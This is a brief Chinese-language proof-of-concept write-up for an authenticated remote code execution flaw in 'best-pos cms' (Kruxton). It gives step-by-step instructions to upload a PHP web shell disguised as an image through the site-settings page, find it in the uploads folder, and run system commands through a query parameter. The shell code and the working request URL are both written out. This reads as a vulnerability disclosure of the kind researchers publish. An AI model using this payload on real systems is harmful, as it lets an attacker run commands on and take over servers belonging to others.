# best-pos cms Authenticated RCE

### 利用步骤
1. 登录
2. 访问`http://localhost/kruxton/index.php?page=site_settings`
3. 上传图片
   1. `<?php system($_GET['cmd']); ?>`
4. 访问 `http://localhost/kruxton/assets/uploads/`
5. 找到上传的shell 文件
6. 执行cmd 验证
   1. `http://localhost/kruxton/assets/uploads/1676627880_shell.png.php?cmd=whoami`